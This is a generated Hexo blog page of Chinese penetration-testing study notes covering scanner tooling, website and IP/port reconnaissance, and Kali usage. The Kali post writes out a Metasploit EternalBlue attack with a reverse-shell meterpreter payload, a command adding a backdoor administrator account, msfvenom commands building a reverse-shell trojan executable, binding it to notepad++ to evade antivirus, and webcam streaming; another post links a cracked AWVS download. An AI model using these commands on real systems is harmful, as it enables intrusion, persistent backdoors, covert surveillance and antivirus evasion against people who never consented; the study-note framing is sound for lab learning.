+<li>下载：<span alt="modern"><a target="_blank" rel="noopener" href="https://cowtransfer.com/s/6f5533db1a6245">https://cowtransfer.com/s/6f5533db1a6245</a></span><br>提取码：<span alt="blank">hetianlab</span></li>
+<li>破解</li>
+</ol>
+<ul>
+<li>将patch.exe和patch.dat复制到AWVS安装目录</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/07/24/AWVS%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/" data-id="cmfjsmkf50000q4e73dv66gfh" data-title="AWVS工具介绍及应用场景" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-渗透测试-网站信息收集" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/07/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BD%91%E7%AB%99%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="article-date">
+  <time class="dt-published" datetime="2023-07-23T02:15:05.000Z" itemprop="datePublished">2023-07-23</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/07/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BD%91%E7%AB%99%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">渗透测试-网站信息收集</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="网站指纹识别"><a href="#网站指纹识别" class="headerlink" title="网站指纹识别"></a>网站指纹识别</h1><p><em>网站的最基本组成：服务器（操作系统）、中间件（web容器）、脚本语言数据库<br>为什么要了解这些？举个例子：发现了一个文件读取漏洞，我们需要读&#x2F;etc&#x2F;passwd，如果是Windows系统根本不会存这个文件</em></p>
+<ol>
+<li>操作系统</li>
+</ol>
+<ul>
+<li>ping判断：Windows的TTL值一般为128，Linux则为64.TTL大于100的一般为Windows，几十的一般为Linux。</li>
+<li>nmap -O参数</li>
+<li>Windows大小写不敏感，Linux则区分大小写</li>
+</ul>
+<ol start="2">
+<li>网站服务\容器类型</li>
+</ol>
+<ul>
+<li>F12查看响应头server字段</li>
+<li>whatweb  <a target="_blank" rel="noopener" href="https://www.whatweb.net/">https://www.whatweb.net/</a></li>
+<li>wappalyzer插件</li>
+</ul>
+<ol start="3">
+<li>脚本类型<br>php，jsp，asp\aspx，python</li>
+<li>数据库类型<br>mysql，sqlserver，access，oracle</li>
+<li>CMS识别<br>常见CMS：dedecms(织梦)，discuz，phpcms等。</li>
+</ol>
+<ul>
+<li>在线识别工具<br><a target="_blank" rel="noopener" href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></li>
+<li>onlinetools<br><a target="_blank" rel="noopener" href="https://github.com/iceyhexman/onlinetools">https://github.com/iceyhexman/onlinetools</a><br><a target="_blank" rel="noopener" href="https://pentest.gbpcisa.org/">https://pentest.gbpcisa.org/</a></li>
+</ul>
+<h2 id="敏感文件及目录探测"><a href="#敏感文件及目录探测" class="headerlink" title="敏感文件及目录探测"></a>敏感文件及目录探测</h2><ol>
+<li>敏感文件、目录<br>github<br>git<br>svn<br>.DS_Store<br>.hg<br>.bzr<br>cvs<br>WEB-INF<br>备份文件、</li>
+<li>GitHub泄露<br>开发人员将代码上传到网站，在上传的时候，没有删除重要的一些信息。如邮箱信息，SVN信息，内部账号和密码，数据库连接信息，服务器配置信息等。尤其是邮箱信息和内部账号和密码。这类信息可以通过github上搜索公司的一些特定信息，查看是否有程序员将这些信息上传到了github上。<br>3.git泄露<br>“.git”intitle:”index of”<br><a target="_blank" rel="noopener" href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a><br>4.网站备份文件<br>网站备份文件泄露指将管理员误将网站备份文件或是敏感信息文件存放在某个网站目录下。<br><a target="_blank" rel="noopener" href="https://github.com/7kbstorm/7kbscan-WebPathBrute">https://github.com/7kbstorm/7kbscan-WebPathBrute</a></li>
+<li>目录探测<br>dirsearch：<a target="_blank" rel="noopener" href="https://github.com/maurosoria/dirsarch">https://github.com/maurosoria/dirsarch</a><br>御剑后台扫描工具<br>dirmap：<a target="_blank" rel="noopener" href="https://github.com/H4ckForjob/dirmap">https://github.com/H4ckForjob/dirmap</a></li>
+</ol>
+<h3 id="网站waf识别"><a href="#网站waf识别" class="headerlink" title="网站waf识别"></a>网站waf识别</h3><ol>
+<li>waf定义<br>waf，即：web Application Firewall（web应用防火墙）。可以通俗的理解为：用于保护网站，防黑客、防网络攻击的安全防护系统；是最有效、最直接的web安全防护产品。</li>
+<li>waf功能<br>1）防止常见的网络攻击，如SQL注入、XSS跨站、CSRF、网页后门等；<br>2）防止各类自动化攻击，如：暴力破解、撞库、批量注册、自动发帖等；<br>3）组织其它常见威胁，如：爬虫、0 DAY攻击、代码分析、嗅探、数据篡改、越权访问、敏感信息泄露、应用层DDOS、远程恶意包含、盗链、越权、扫描等。</li>
+<li>waf识别<br>wafw00f<br><a target="_blank" rel="noopener" href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a><br>nmap- p80,443 –script http-waf-detect ip<br>nmap -p80,443 –script http-waf-fingerprint ip</li>
+</ol>
+<h4 id="相关实验"><a href="#相关实验" class="headerlink" title="相关实验"></a>相关实验</h4><ul>
+<li><a target="_blank" rel="noopener" href="https://www.hetianlab.com/expc.do?ec=ECID172.19.104.182016012110581600001">https://www.hetianlab.com/expc.do?ec=ECID172.19.104.182016012110581600001</a></li>
+</ul>
+<hr>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/07/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E7%BD%91%E7%AB%99%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" data-id="cmfjsmkfo000sq4e73wdw2imi" data-title="渗透测试-网站信息收集" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-渗透测试-IP端口信息收集" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/07/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-IP%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="article-date">
+  <time class="dt-published" datetime="2023-07-21T11:35:58.000Z" itemprop="datePublished">2023-07-21</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/07/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-IP%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">渗透测试-IP端口信息收集</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="IP信息收集"><a href="#IP信息收集" class="headerlink" title="IP信息收集"></a>IP信息收集</h1><ul>
+<li>IP反查域名<br><em><a target="_blank" rel="noopener" href="http://stool.chinaz.com/same">http://stool.chinaz.com/same</a></em><br><em><a target="_blank" rel="noopener" href="https://tools.ipip.net/ipdomain.php">https://tools.ipip.net/ipdomain.php</a></em><br>如果渗透目标为虚拟主机，那么通过IP反查到的域名信息很有价值，因为一台物理服务器上面可能运行多个虚拟主机。这些虚拟主机有不同的域名，但通常公用一个IP地址。如果你知道有哪些网站共用这台服务器，就有可能通过此台服务器上其他网站的漏洞获取服务器控制权，进而迂回获取渗透目标的权限，这种技术也陈为“旁注”。</li>
+<li>CDN<br>CDN既内容分发网络。CDN是构建在网络之上的内容分发网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率</li>
+</ul>
+<ol>
+<li>IP信息收集-判断CDN</li>
+</ol>
+<ul>
+<li>多地ping<br><em><a target="_blank" rel="noopener" href="http://ping.chinaz.com/">http://ping.chinaz.com/</a></em><br><em><a target="_blank" rel="noopener" href="http://www.webkaka.com/Ping.aspx">http://www.webkaka.com/Ping.aspx</a></em></li>
+</ul>
+<ol start="2">
+<li>IP信息收集-绕过CDN</li>
+</ol>
+<ul>
+<li>国外访问<br><em><a target="_blank" rel="noopener" href="https://asm.ca.com/en/ping.php">https://asm.ca.com/en/ping.php</a></em></li>
+<li>查询子域名的IP</li>
+<li>phpinfo文件</li>
+<li>Mx记录邮件服务</li>
+<li>查询历史DNS记录<br><em><a target="_blank" rel="noopener" href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a></em><br><em><a target="_blank" rel="noopener" href="https://securitytrails.com/">https://securitytrails.com/</a></em><br><em><a target="_blank" rel="noopener" href="https://x.threatbook/cn/">https://x.threatbook/cn/</a></em></li>
+</ul>
+<h4 id="IP信息收集-C段存活主机探测"><a href="#IP信息收集-C段存活主机探测" class="headerlink" title="IP信息收集-C段存活主机探测"></a>IP信息收集-C段存活主机探测</h4><ul>
+<li>Nmap<br>nmap -sP <a target="_blank" rel="noopener" href="http://www.xxx.com/24">www.XXX.com/24</a> || nmap -sP 192.168.1.*<br><a target="_blank" rel="noopener" href="https://github.com/se55i0n/Cwebscanner">https://github.com/se55i0n/Cwebscanner</a></li>
+</ul>
+<h2 id="端口信息收集"><a href="#端口信息收集" class="headerlink" title="端口信息收集"></a>端口信息收集</h2><p><em>端口简介</em>：在linternet上，个主机间通过TCP&#x2F;IP协议发送和接受数据包，各个数据包根据器目的的主机的IP地址来进行互联网络中的路由选择，从而顺利的将数据包顺利的传送给目标主机</p>
+<ol>
+<li>协议端口<br>根据提供服务类型的不同，端口可分为以下两种：<br>TCP端口：TCP是一种面向连接的可靠的传输层通信协议<br>UDP端口：UDP是一种无连接的不可靠的传输层协议<br>TCP协议和UDP协议是独立的，因此各自的端口号也相互独立。</li>
+<li>端口类型<br>周知端口：众所周知的端口号，范围：0-1023，如80端口是WWW服务<br>动态端口：一般不固定分配某种服务，范围：49152-65535<br>注册端口：范围：1024-49151，用于分配给用户进程或程序</li>
+<li>端口作用<br>把服务器比作房子，而端口可比作门；<br>窃贼想要在没经过房子主人允许进入房子，就需要破门而入；<br>窃贼在破门之前，得先了解房子开了几扇门，门后是什么东西，也就是踩点；踩点得到的信息越多对于窃贼顺利的窃取有价值的东西至关重要。</li>
+<li>渗透端口</li>
+<li>FTP-21<br>FTP：文件传输协议，使用TCP端口20、21、20用于传输数据，21用于传输控制信息<br>（1）ftp基础爆破：owasp的Bruter，hydra以及msf中的ftp爆破模块。<br>（2）ftp匿名访问：用户名：anonymous密码：为空或者任意邮箱。<br>（3）vsftp后门：vsftp 2到2.3.4版本存在后门漏洞，通过该漏洞获取root权限。<br>（4）嗅探：ftp使用明文传输，使用Cain进行渗透。（但是嗅探需要在局域网并需要欺骗或监听网关）<br>（5）ftp远程代码溢出。<br>（6）ftp跳转攻击。</li>
+<li>SSH-22<br>SSH：（secure shell）是目前较可靠，专为远程登陆会话和其他网络服务提供安全性的协议。<br>（1）弱口令，可使用工具hydra，msf中的ssh爆破模块。<br>（2）SSH后门<br>（3）openssh用户枚举CVE-2018-15473.</li>
+<li>Telnet-23<br>Telnet协议是TCP&#x2F;IP协议族中的一员，是lnternet远程登陆服务的标准协议和主要方式。<br>（1）暴力破解，使用hydra，或者msf中telnet模块对其进行破解。<br>（2）在Linux系统中一般采用SSH进行远程访问，传输的敏感数据都是经过加密的。而对于Windows下的telnet来说是脆弱的，因为默认没有经过任何加密就在网络中进行传输。使用cain等嗅探工具轻松截获远程登陆密码。</li>
+<li>SMTP-25&#x2F;465<br>smtp：邮件协议，在Linux中默认开启这个服务，可发送钓鱼邮件默认端口：25（smtp）、465（smtps）<br>（1）爆破：弱口令，使用hydra<br>（2）SMTP无认证伪造发件人</li>
+<li>WWW-80<br>为超文本传输协议（HTTP）开放的端口，主要用于万维网传输信息的协议<br>（1）中间件漏洞，如IIS、apache、nginx等<br>（2）80端口一般通过web应用程序的常见漏洞进行攻击</li>
+<li>MySQL-3306<br>3306是MYSQL数据库默认的监听端口<br>（1）mysql弱口令破解<br>（2）弱口令登陆mysql，上传构造的恶意UDP自定义函数代码，通过调用注册的恶意函数执行系统命令<br>（3）SQL注入获取数据库敏感信息，load_file()函数读取系统文件，导出恶意代码到指定路径</li>
+<li>Nmap介绍<br>Network Mapper，是一款开放源代码的网络探测和安全审核的工具<br><em><a target="_blank" rel="noopener" href="https://nmap.org/man/zh/">https://nmap.org/man/zh/</a></em></li>
+<li>功能介绍<br>（1）检测网络存活主机（主机发现）<br>（2）检测主机开放端口（端口发现或枚举）<br>（3）检测相应端口软件（服务发现）版本<br>（4）检测操作系统，硬件地址，以及软件版本<br>（5）检测脆弱性的漏洞（nmap的脚本）</li>
+<li>端口状态<br>（1）open      端口开启，有程序在监控上监控<br>（2）closed    端口关闭，数据有到达主机，没有程序在端口上监控<br>（3）filtered  数据没有到达主机，返回的结果为空，数据被防火墙或IDS过滤</li>
+<li>探测存活主机<br>namap -sn -v -T4 -oG Discovere.gnmap 172.26.1.0&#x2F;24<br>grep “Status:Up” Discovery.gnmap | cut -f 2 -d ‘’&gt;liveHosts.txt</li>
+<li>扫描全部端口<br>nmap -sS -v -T4 -Pn -p 0-65535 -oN FullTCP -iL liveHosts.txt</li>
+</ol>
+<ul>
+<li>-sS：SYN扫描，又称为半开放扫描，它不打开一个完全的TCP连接，执行的快，效率高（一个完整的tcp连接需要3次握手，而-sS选项不需要3次握手）<br>优点：他需要root&#x2F;administrator权限执行</li>
+<li>-Pn：扫描之前不需要ping命令，有些防火墙禁止ping命令。可以进行此选项进行扫描</li>
+<li>-iL：导入需要扫描的列表</li>
+<li>nmap -O 系统扫描</li>
+<li>nmap -sV 版本检测</li>
+</ul>
+<ol start="16">
+<li>nmap漏洞扫描</li>
+</ol>
+<h3 id="其他信息收集"><a href="#其他信息收集" class="headerlink" title="其他信息收集"></a>其他信息收集</h3><ol>
+<li>历史漏洞信息</li>
+</ol>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://wy.zone.ci/">http://wy.zone.ci/</a></li>
+<li><a target="_blank" rel="noopener" href="https://wooyun.kieran.top/#!/">https://wooyun.kieran.top/#!/</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></li>
+<li><a target="_blank" rel="noopener" href="https://wiki.0-sec.org/#/md">https://wiki.0-sec.org/#/md</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.seebug.org/">https://www.seebug.org/</a></li>
+</ul>
+<ol start="2">
+<li>社会工程学</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/07/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-IP%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" data-id="cmfjsmkfo000qq4e766godgz5" data-title="渗透测试-IP端口信息收集" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-信息收集" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/07/21/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="article-date">
+  <time class="dt-published" datetime="2023-07-21T01:59:32.000Z" itemprop="datePublished">2023-07-21</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/07/21/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="什么是信息收集"><a href="#什么是信息收集" class="headerlink" title="什么是信息收集"></a>什么是信息收集</h1><p>信息收集是指通过各种方式获取所需要的信息，以便我们在后续的渗透过程更好的进行。比如目标站点ip、中间件、脚本语言、端口、邮箱等等。信息收集包含资产收集但不限于资产收集。</p>
+<ul>
+<li>信息收集的意义</li>
+</ul>
+<ol>
+<li>信息收集是渗透测试成功的保障</li>
+<li>更多的暴露面</li>
+<li>更大的可能性</li>
+</ol>
+<ul>
+<li>信息收集的分类<br><em>通过直接访问网站在网站上进行操作、对网站进行扫描等、这种是有网络流量经过目标服务器的新信息收集方式。</em></li>
+<li>被动信息收集<br><em>基于公开的渠道，比如搜索引擎等，再不与目标系统直接交互的情况下获取信息，并且尽量避免留下痕迹。</em></li>
+<li>收集那些信息</li>
+</ul>
+<ol>
+<li>服务器信息（端口、服务、真实IP）</li>
+<li>网站信息（网站架构（操作系统、中间件、数据库、编程语言）、指纹信息、WAF、敏感目录、敏感文件、源码泄露、旁站查询、C段查询）</li>
+<li>域名信息（whois、备案信息、子域名）</li>
+<li>人员信息（姓名、职务、生日、联系电话、邮件地址）</li>
+</ol>
+<h2 id="域名信息收集"><a href="#域名信息收集" class="headerlink" title="域名信息收集"></a>域名信息收集</h2><ul>
+<li>域名介绍<br><em>域名（Domain Name），简称域名、网域，是由一串用点分隔的名字组成的lnternet上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位（有时也指地理位置）。</em><br><em>DNS（域名系统，Domain Name System）是互联网的一项服务。它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。</em></li>
+<li>域名分类<br><strong>顶级域名 .com  二级域名 baidu.com  三级域名 <a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a><br>政府域名 .gov  商业域名 .com  教育域名 .edu</strong></li>
+<li>Whois<br><em>whois是用来查询域名的IP以及所有者等信息的传输协议。就是一个用来查询域名是否被注册，以及注册域名的详细信息的数据库(如域名所有人，域名注册商)</em></li>
+<li>Whois查询<br><em>whois查询的重要性：通过whois查询可以获得域名注册者邮箱地址等信息。一般情况下对于中小型网站域名注册者就是网站管理员。利用搜索引擎对whois查询到信息进行搜索，获取更多域名注册者的个人信息。</em></li>
+<li>查询方法<br><strong>Web接口查询 <a target="_blank" rel="noopener" href="https://whois.aliyun.com/">https://whois.aliyun.com/</a><br>whois命令行查询 Whois baidu.com</strong></li>
+</ul>
+<h3 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h3><ul>
+<li>子域名介绍<br>*子域名指二级域名，二级域名是顶级域名(一级域名)的下一级。<br>比如mail.heetian.com和bbs.heetian.com是heetian.com的子域，而heetian.com则是顶级域名 .com的子域。</li>
+<li>网络空间安全搜索引擎<br><em><a target="_blank" rel="noopener" href="https://fofa.so/">https://fofa.so/</a></em></li>
+<li>ssl证书查询<br><em><a target="_blank" rel="noopener" href="https://crt.sh/">https://crt.sh/</a></em><br>-Js文件发现子域名<br><em><a target="_blank" rel="noopener" href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a></em><br>子域名爆破</li>
+</ul>
+<hr>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/07/21/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" data-id="cmfjsmkfg000aq4e7adkkhlmv" data-title="信息收集" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-体验kali渗透" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/07/20/%E4%BD%93%E9%AA%8Ckali%E6%B8%97%E9%80%8F/" class="article-date">
+  <time class="dt-published" datetime="2023-07-20T10:19:59.000Z" itemprop="datePublished">2023-07-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/07/20/%E4%BD%93%E9%AA%8Ckali%E6%B8%97%E9%80%8F/">体验kali渗透</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="体验kali渗透工具"><a href="#体验kali渗透工具" class="headerlink" title="体验kali渗透工具"></a>体验kali渗透工具</h1><ol>
+<li>metasploit 攻击 windows 操作系统<br>启动metasploit前需要做：</li>
+</ol>
+<ul>
+<li>打开kali终端</li>
+<li>使用sudo su命令，并输入kali的密码kali，切换至root用户</li>
+<li>使用msfdb init命令 初始化metasploit数据库（*可选）</li>
+</ul>
+<h2 id="永恒之蓝漏洞："><a href="#永恒之蓝漏洞：" class="headerlink" title="永恒之蓝漏洞："></a>永恒之蓝漏洞：</h2><p>metasploit攻击永恒之蓝全流程：</p>
+<ol>
+<li>使用模块<br>use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</li>
+<li>设置必选项<br>查看必选项[*required 为 yes的就是必选项]<br>show options<br>set RHOSTS 192.168.1.128<br>[*RHOSTS为target host(s)代表你要攻击谁]</li>
+</ol>
+<p>set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp<br>[*payload是攻击载荷，就是攻击完成后想干啥，这里是想获取meterpreter]<br>[*meterpreter是meteasploit后渗透的神器]</p>
+<p>set LHOSTS 192.168.1.136<br>[*LHOSTS为listen host 代表你是谁，既kali的ip地址]</p>
+<p>set LPORT 12345<br>[*LPORT为listen port，代表你要在kali上开启的端口，1-65535随便选，但不能被占用]</p>
+<ol start="3">
+<li>运行模块，完成攻击<br>run</li>
+</ol>
+<h3 id="攻击成功后能做什么"><a href="#攻击成功后能做什么" class="headerlink" title="攻击成功后能做什么"></a>攻击成功后能做什么</h3><p>meterpreter是强大的后渗透模块，可以输入help查看帮助信息</p>
+<p>远程控制、命令执行、摄像头监控、密码获取、创建后门用户、破坏篡改系统…</p>
+<p>例：创建后门用户并开启远程连接<br>shell<br>net user zhangsan 123456&#x2F;add &amp;&amp; net localgroup administrators zhangsan &#x2F;add exit<br>run getgui-e</p>
+<h4 id="使用kali渗透工具生成远控木马"><a href="#使用kali渗透工具生成远控木马" class="headerlink" title="使用kali渗透工具生成远控木马"></a>使用kali渗透工具生成远控木马</h4><p>msfvenom是用来生成后门的软件，在目标上执行后门，在本地上监听上线。<br>[*msfvenom在shell里使用，不是msfconsole终端]</p>
+<p>Windows可执行程序后门：<br>msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;revers_tcp host&#x3D;192.168.123.136 lport&#x3D;9999 -f exe -o demo.exe</p>
+<p>-p：payload   -f：formant  exe：Windows可执行文件  -o：output</p>
+<p>生成木马在msfconsole里开启监听，等待受害者上钩<br>use exploit&#x2F;mutil&#x2F;handler<br>set payload windows&#x2F;x64&#x2F;meterprter&#x2F;reverse_tcp<br>set lhost 192.168.123.163<br>set lport 9999<br>run<br>参数要一致</p>
+<h5 id="免杀躲避火绒的探测"><a href="#免杀躲避火绒的探测" class="headerlink" title="免杀躲避火绒的探测"></a>免杀躲避火绒的探测</h5><ol>
+<li>最基础的免杀[*对于其他杀毒软件效果不同，具体情况请自行尝试]<br>捆绑木马<br>msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.1.136 lport&#x3D;9999 -f exe -x notepad+ +.exe -o notepad+ +.exe</li>
+</ol>
+<p>加壳：压缩壳、加密壳</p>
+<p>例：打开摄像头<br>meterpreter&gt; webcam_stream<br>Starting…<br>Preparing player…<br>Opening player at: &#x2F;home&#x2F;kali&#x2F;nprnAywg.html<br>Streaming…</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/07/20/%E4%BD%93%E9%AA%8Ckali%E6%B8%97%E9%80%8F/" data-id="cmfjsmkfi000dq4e7bublas1a" data-title="体验kali渗透" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+
+
+  <nav id="page-nav">
+    
+    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
+  </nav>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag">笔记</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">笔记</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/09/">September 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">April 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">September 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/09/16/%E6%B5%8B%E8%AF%95%E5%8D%9A%E5%AE%A21/">测试博客1</a>
+          </li>
+        
+          <li>
+            <a href="/2025/09/14/%E5%8D%9A%E5%AE%A2%E6%B5%8B%E8%AF%95/">博客测试</a>
+          </li>
+        
+          <li>
+            <a href="/2025/09/14/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2025/09/11/%E6%B5%8B%E8%AF%95/">测试</a>
+          </li>
+        
+          <li>
+            <a href="/2024/04/05/%E5%88%A9%E7%94%A8kali%E7%A0%B4%E8%A7%A3wifi%E5%AF%86%E7%A0%81-1/">利用kali破解wifi密码</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
